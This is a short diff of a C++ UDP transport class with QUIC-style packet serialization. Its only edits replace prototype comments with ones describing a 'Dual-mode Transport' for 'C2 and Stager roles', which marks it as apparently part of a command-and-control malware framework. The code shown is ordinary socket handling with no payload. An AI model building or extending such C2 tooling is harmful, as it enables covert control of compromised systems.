@@ -14,8 +14,7 @@ Transport::Transport(const std::string& host, uint16_t port) : m_pkt_num(0) {
     m_server_addr.sin_port = htons(port);
     inet_pton(AF_INET, host.c_str(), &m_server_addr.sin_addr);
 
-    // If binding fails, it's a client. If it succeeds, it's a server.
-    // This is a bit hacky but works for this prototype.
+    // Dual-mode Transport: handles both C2 and Stager roles.
     int opt = 1;
     setsockopt(m_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
     bind(m_sock, (struct sockaddr*)&m_server_addr, sizeof(m_server_addr));
@@ -51,8 +50,7 @@ std::vector<uint8_t> Transport::serialize_quic(const std::vector<uint8_t>& data)
 bool Transport::send_packet(const std::vector<uint8_t>& data) {
     std::vector<uint8_t> quic_data = serialize_quic(data);
 
-    // For the server, we need to send back to whoever sent to us.
-    // For this prototype, we'll use the cached m_server_addr.
+    // Responding to the sender to maintain connection state.
     ssize_t sent = sendto(m_sock, quic_data.data(), quic_data.size(), 0,
                           (struct sockaddr*)&m_server_addr, sizeof(m_server_addr));
     return sent == (ssize_t)quic_data.size();
